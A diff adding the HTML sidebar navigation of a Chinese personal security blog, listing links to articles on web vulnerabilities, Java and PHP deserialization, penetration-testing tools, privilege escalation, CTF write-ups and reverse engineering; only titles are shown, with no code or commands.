+<li><a href="https://blog.csdn.net/SKI_12/article/details/57405291" target="_blank" rel="noopener">(旧博客)在Windows和Linux系统下隐藏痕迹的小技巧</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/57403811" target="_blank" rel="noopener">(旧博客)在Windows和Linux系统中的一些信息收集方法</a></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76598873" target="_blank" rel="noopener">(旧博客)使用Kali无线渗透获取宿舍WiFi密码（WPA）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62239673" target="_blank" rel="noopener">(旧博客)关于Kali的两个Webshell（Webacoo和Weevely）的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62064984" target="_blank" rel="noopener">(旧博客)关于Kali获取HTTP账号密码的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62045632" target="_blank" rel="noopener">(旧博客)关于Kali进行ARP欺骗的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/61926977" target="_blank" rel="noopener">(旧博客)关于Kali进行ARP攻击的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/61920179" target="_blank" rel="noopener">(旧博客)在Kali中安装IBus的拼音输入法</a></li>
+<li></li>
+</ul>
+</li>
+<li>Metasploit<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60881390" target="_blank" rel="noopener">(旧博客)关于Metasploit的学习笔记（一）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62427016" target="_blank" rel="noopener">(旧博客)关于Metasploit的学习笔记（二）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/77103290" target="_blank" rel="noopener">(旧博客)Metasploit的Docker安装及其Eternal Blue（永恒之蓝）渗透实现</a></li>
+</ul>
+</li>
+<li>内网渗透<ul>
+<li><a href="/2020/02/15/内网渗透基础/">内网渗透基础与域环境搭建</a></li>
+<li><a href="/2020/02/18/Windows-PowerShell基础/">内网渗透之Windows PowerShell基础</a></li>
+<li><a href="/2020/02/27/内网信息收集之本机信息收集/">内网信息收集之本机信息收集</a></li>
+<li><a href="/2020/03/08/内网信息收集之域相关信息收集/">内网信息收集之域相关信息收集</a></li>
+</ul>
+</li>
+<li>提权<ul>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
+</ul>
+</li>
+<li>免杀</li>
+<li>工具<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78333085" target="_blank" rel="noopener">(旧博客)Wireshark进阶之网络问题案例分析</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/61651960" target="_blank" rel="noopener">(旧博客)关于nmap所有的参数</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60332892" target="_blank" rel="noopener">(旧博客)关于Xsser的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60151041" target="_blank" rel="noopener">(旧博客)关于skipfish的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/58677137" target="_blank" rel="noopener">(旧博客)关于Vega的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/58188331" target="_blank" rel="noopener">(旧博客)关于SQLMAP所有参数的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/57418307" target="_blank" rel="noopener">(旧博客)关于NETCAT的学习笔记</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>OS</strong><ul>
+<li>Windows<ul>
+<li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
+<li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78716967" target="_blank" rel="noopener">(旧博客)Windows系统安全小结</a></li>
+</ul>
+</li>
+<li>Linux<ul>
+<li><a href="/2020/03/28/Linux安全笔记/">Linux安全笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78169962" target="_blank" rel="noopener">(旧博客)Linux查找命令小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/72614754" target="_blank" rel="noopener">(旧博客)关于iptables防火墙的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63680773" target="_blank" rel="noopener">(旧博客)关于Linux日志的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78837765" target="_blank" rel="noopener">(旧博客)Ubuntu搭建MongoDB集群</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><strong>云</strong><ul>
+<li>云安全</li>
+<li>Docker<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76696436" target="_blank" rel="noopener">(旧博客)Docker基本命令以及Ubuntu16.04更换源</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76713869" target="_blank" rel="noopener">(旧博客)使用Docker搭建基于MySQL、Apache和PHP的DVWA服务器</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+
+<script src="/js/book-sidebar.js"></script>
+
+<script>
+collapse_sidebar(2)
+highlight_tab()
+show_sidebar()
+</script>
+      </div>
+
+      <div class="column col-8 col-lg-12">
+        <div class="book-content">
+          <div class="book-navbar">
+  <header class="navbar">
+  <section class="navbar-section">
+    <img class="navbar-icon" src="/kanxi.jpg">
+  </section>
+  <section class="navbar-center">
+    Mi1k7ea
+  </section>
+  <section class="navbar-section">
+    <label class="accordion-header c-hand" for="accordion-sidebar">
+      <i class="icon icon-menu"></i>
+    </label>
+  </section>
+</header>
+
+<div class="accordion">
+  <input type="checkbox" id="accordion-sidebar" name="accordion-checkbox" hidden>
+  <div class="accordion-body">
+    <p>Good Good Study</p>
+<ul>
+<li><strong><a href="/archives">归档</a></strong>    |    <strong><a href="/secwebsite/">站点收录</a></strong>    |    <strong><a href="/atom.xml">RSS</a></strong></li>
+</ul>
+<hr>
+<ul>
+<li><strong>Web安全</strong><ul>
+<li>Web安全基础&amp;Tricks<ul>
+<li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li>
+<li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li>
+<li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li>
+<li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li>
+<li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li>
+<li><a href="/2020/04/06/浅析postMessage安全/">postMessage跨域漏洞总结</a></li>
+<li><a href="/2020/01/04/浅析XSSI漏洞/">浅析XSSI漏洞</a></li>
+<li><a href="/2020/03/11/浅析HRS漏洞/">浅析HRS漏洞</a></li>
+<li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li>
+<li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li>
+<li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li>
+<li><a href="/2020/03/05/Redis安全小结/">Redis安全小结</a></li>
+<li><a href="/2020/02/29/SSRF-Tricks小结/">SSRF Tricks小结</a></li>
+<li><a href="/2020/01/21/CSRF-Tricks小结/">CSRF Tricks小结</a></li>
+<li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li>
+<li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li>
+<li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li>
+<li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
+<li><a href="/2020/04/06/从浏览器解析原理看XSS/">从浏览器解析原理看XSS</a></li>
+<li><a href="/2020/04/07/跨域通信中的XSS利用/">跨域通信中的XSS利用</a></li>
+<li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li>
+<li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li>
+<li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li>
+<li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li>
+<li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li>
+<li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li>
+<li><a href="/2020/01/26/浅析XSSJacking/">浅析XSSJacking</a></li>
+<li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li>
+<li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78716609" target="_blank" rel="noopener">(旧博客)Web安全加固小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78686832" target="_blank" rel="noopener">(旧博客)DoS与DDoS小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78301189" target="_blank" rel="noopener">(旧博客)MySQL数据库提权小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/69952026" target="_blank" rel="noopener">(旧博客)OWASP_top_10漏洞的总结笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76944203" target="_blank" rel="noopener">(旧博客)使用Docker搭建Nginx整数溢出漏洞（CVE-2017-7529）及Python PoC验证</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76862120" target="_blank" rel="noopener">(旧博客)使用Docker搭建Struts2-048漏洞环境及Python PoC验证</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76714002" target="_blank" rel="noopener">(旧博客)webshell的NTFS交换数据流文件隐藏及Python脚本查杀</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/59085529" target="_blank" rel="noopener">(旧博客)关于phpMyAdmin默认安装漏洞的学习笔记</a></li>
+</ul>
+</li>
+<li>Web安全之机器学习<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78457976" target="_blank" rel="noopener">(旧博客)机器学习应用之WebShell检测</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78298719" target="_blank" rel="noopener">(旧博客)数据挖掘之k-means算法的Python实现</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78012697" target="_blank" rel="noopener">(旧博客)数据挖掘之决策树归纳算法的Python实现</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78003975" target="_blank" rel="noopener">(旧博客)数据挖掘之Apriori算法的Python实现</a></li>
+</ul>
+</li>
+<li>WriteUp Web<ul>
+<li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li>
+<li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li>
+<li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li>
+<li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li>
+<li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li>
+<li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li>
+<li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li>
+<li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li>
+<li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li>
+<li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li>
+<li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li>
+<li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li>
+<li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li>
+<li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li>
+<li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li>
+<li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80306977" target="_blank" rel="noopener">(旧博客)通过Pentester_Lab学习XML注入</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/70168346" target="_blank" rel="noopener">(旧博客)Sqli-labs之Less1-10</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60882602" target="_blank" rel="noopener">(旧博客)DVWA之PHP文件包含漏洞（File Inclusion）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60477557" target="_blank" rel="noopener">(旧博客)通过DVWA学习CSRF漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60465854" target="_blank" rel="noopener">(旧博客)通过DVWA学习存储型XSS漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60359729" target="_blank" rel="noopener">(旧博客)通过DVWA学习反射型XSS漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/56307364" target="_blank" rel="noopener">(旧博客)通过DVWA学习SQL盲注</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/56279676" target="_blank" rel="noopener">(旧博客)通过DVWA学习SQL注入漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/54669614" target="_blank" rel="noopener">(旧博客)DVWA之PHP文件上传漏洞（File Upload）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/54630440" target="_blank" rel="noopener">(旧博客)通过DVWA学习命令执行漏洞（Command Execution）</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Java</strong><ul>
+<li>Java安全<ul>
+<li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li>
+<li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li>
+<li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li>
+<li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li>
+<li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li>
+<li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li>
+<li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li>
+<li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li>
+<li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li>
+<li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li>
+<li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li>
+<li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li>
+<li><a href="/2020/01/10/SpEL表达式注入漏洞总结/">SpEL表达式注入漏洞总结</a></li>
+<li><a href="/2020/03/16/OGNL表达式注入漏洞总结/">OGNL表达式注入漏洞总结</a></li>
+<li><a href="/2020/03/24/浅析Groovy代码注入漏洞/">浅析Groovy代码注入漏洞</a></li>
+<li><a href="/2020/04/12/浅析Easy-Rules代码注入漏洞/">浅析Easy-Rules代码注入漏洞</a></li>
+<li><a href="/2020/04/11/浅析QLExpress表达式注入漏洞/">浅析QLExpress表达式注入漏洞</a></li>
+<li><a href="/2020/04/11/浅析BeanShell代码注入漏洞/">浅析BeanShell代码注入漏洞</a></li>
+<li><a href="/2020/04/11/浅析JUEL表达式注入漏洞/">浅析JUEL表达式注入漏洞</a></li>
+<li><a href="/2020/04/11/浅析JSEL表达式注入漏洞/">浅析JSEL表达式注入漏洞</a></li>
+<li><a href="/2020/04/11/浅析MvEL表达式注入漏洞/">浅析MvEL表达式注入漏洞</a></li>
+<li><a href="/2020/04/11/浅析FEL表达式注入漏洞/">浅析FEL表达式注入漏洞</a></li>
+<li><a href="/2020/04/11/浅析JEXL表达式注入漏洞/">浅析JEXL表达式注入漏洞</a></li>
+<li><a href="/2019/12/08/浅析Java-SPI安全/">浅析Java SPI安全</a></li>
+<li><a href="/2020/04/01/Tomcat-URL解析差异性及利用/">Tomcat URL解析差异性及利用</a></li>
+<li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li>
+<li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li>
+<li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li>
+<li><a href="/2019/11/29/Java-SnakeYaml反序列化漏洞">Java SnakeYaml反序列化漏洞</a></li>
+<li><a href="/2019/12/07/Java-AMF3反序列化漏洞/">Java AMF3反序列化漏洞</a></li>
+<li><a href="/2020/01/25/Java-Hessian反序列化漏洞/">Java Hessian反序列化漏洞</a></li>
+<li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li>
+<li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li>
+<li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
+<li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li>
+<li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li>
+<li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li>
+<li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li>
+<li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li>
+<li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li>
+<li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li>
+<li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li>
+<li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li>
+</ul>
+</li>
+<li>Struts2</li>
+<li>Spring<ul>
+<li><a href="/2019/01/01/Spring基础篇之基本概念/">Spring基础篇之基本概念</a></li>
+<li><a href="/2019/01/01/Spring基础篇之IoC容器/">Spring基础篇之IoC容器</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean/">Spring基础篇之Bean</a></li>
+<li><a href="/2019/01/01/Spring基础篇之DI（依赖注入）/">Spring基础篇之DI（依赖注入）</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean装配/">Spring基础篇之Bean装配</a></li>
+<li><a href="/2019/01/01/Spring基础篇之AOP/">Spring基础篇之AOP</a></li>
+<li><a href="/2019/01/01/Spring基础篇之JDBC框架/">Spring基础篇之JDBC框架</a></li>
+<li><a href="/2019/01/01/Spring基础篇之事务管理/">Spring基础篇之事务管理</a></li>
+<li><a href="/2020/01/16/Spring-MVC笔记/">Spring MVC笔记</a></li>
+<li><a href="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/">浅析自动绑定漏洞之Spring MVC</a></li>
+<li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li>
+<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之CVE-2017-8046</a></li>
+<li><a href="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/">浅析Spring Data Commons之CVE-2018-1273</a></li>
+<li><a href="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/">浅析Spring Messaging之CVE-2018-1270</a></li>
+<li><a href="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/">浅析Spring Web Flow之CVE-2017-4971</a></li>
+<li><a href="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/">浅析Spring Security OAuth2之CVE-2016-4977</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>PHP</strong><ul>
+<li>PHP安全<ul>
+<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
+<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
+<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
+<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
+<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
+<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
+<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
+<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
+<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
+<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
+<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
+<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
+<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
+<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
+<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
+<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
+<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
+<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
+<li><a href="/2020/04/06/PHP代码审计敏感配置与版本特性/">PHP代码审计敏感配置与版本特性</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/70228700" target="_blank" rel="noopener">(旧博客)PHP代码审计之基础篇</a></li>
+</ul>
+</li>
+<li>CMS<ul>
+<li><a href="/2019/01/02/PHP代码审计实战之盾灵CMS/">PHP代码审计实战之盾灵CMS</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78358332" target="_blank" rel="noopener">(旧博客)PHP代码审计实战之MetInfo CMS</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78304692" target="_blank" rel="noopener">(旧博客)PHP代码审计实战之XDcms</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Python</strong><ul>
+<li>Python安全<ul>
+<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
+<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
+<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
+<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
+<li><a href="/2020/03/09/Python-urllib-CRLF注入漏洞小结/">Python urllib CRLF注入漏洞小结</a></li>
+</ul>
+</li>
+<li>安全开发<ul>
+<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
+<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
+<li><a href="/2020/04/08/Python安全小工具之MySQL监控代理/">Python安全小工具之MySQL监控代理</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78705998" target="_blank" rel="noopener">(旧博客)Python安全小工具之日志分析识别AWVS扫描</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78445866" target="_blank" rel="noopener">(旧博客)Python安全小工具之Linux日志痕迹清除</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78443601" target="_blank" rel="noopener">(旧博客)Python安全小工具之Web目录扫描器</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78003891" target="_blank" rel="noopener">(旧博客)Python安全小工具之计算文件Hash值</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78003609" target="_blank" rel="noopener">(旧博客)Python安全小工具之生成高精度字典</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/72972238" target="_blank" rel="noopener">(旧博客)关于《Python绝技：运用Python成为顶级黑客》的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/71152826" target="_blank" rel="noopener">(旧博客)关于《Python黑帽子：黑客与渗透测试编程之道》的学习笔记</a></li>
+</ul>
+</li>
+<li>爬虫<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/68961258" target="_blank" rel="noopener">(旧博客)Python爬虫之基础篇</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78411824" target="_blank" rel="noopener">(旧博客)Python爬虫之爬取动态页面数据</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78840444" target="_blank" rel="noopener">(旧博客)Python爬虫之Scrapy爬虫框架</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78850550" target="_blank" rel="noopener">(旧博客)Python爬虫之分布式爬虫</a></li>
+</ul>
+</li>
+<li>Django<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78505235" target="_blank" rel="noopener">(旧博客)基于Django搭建简单的博客系统</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>JavaScript</strong><ul>
+<li>JavaScript安全<ul>
+<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
+</ul>
+</li>
+<li>Node.js<ul>
+<li><a href="/2020/03/29/浅析Node-js安全/">浅析Node.js安全</a></li>
+<li><a href="/2020/03/29/node-serialize反序列化漏洞/">node-serialize反序列化漏洞</a></li>
+</ul>
+</li>
+<li>AngularJS<ul>
+<li><a href="/2020/03/29/浅析AngularJS安全/">浅析AngularJS安全</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>GO</strong><ul>
+<li>GO安全<ul>
+<li><a href="/2020/01/01/浅析Influxdb认证绕过漏洞/">浅析Influxdb认证绕过漏洞</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>二进制安全</strong><ul>
+<li>二进制基础<ul>
+<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
+<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
+<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
+<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
+<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
+<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
+<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
+</ul>
+</li>
+<li>C/C++<ul>
+<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
+<li><a href="/2020/04/08/C编写实现AWD进程木马/">C编写实现AWD进程木马</a></li>
+</ul>
+</li>
+<li>逆向工程<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80334012" target="_blank" rel="noopener">(旧博客)逆向分析HelloWorld程序</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80380974" target="_blank" rel="noopener">(旧博客)逆向分析abex’crackme#1</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80546988" target="_blank" rel="noopener">(旧博客)逆向分析abex’crackme #2</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80549743" target="_blank" rel="noopener">(旧博客)函数调用约定</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80554677" target="_blank" rel="noopener">(旧博客)栈帧</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80558193" target="_blank" rel="noopener">(旧博客)逆向分析Tut.ReverseMe1</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80571933" target="_blank" rel="noopener">(旧博客)PE文件格式</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80611969" target="_blank" rel="noopener">(旧博客)运行时压缩（UPX）</a></li>
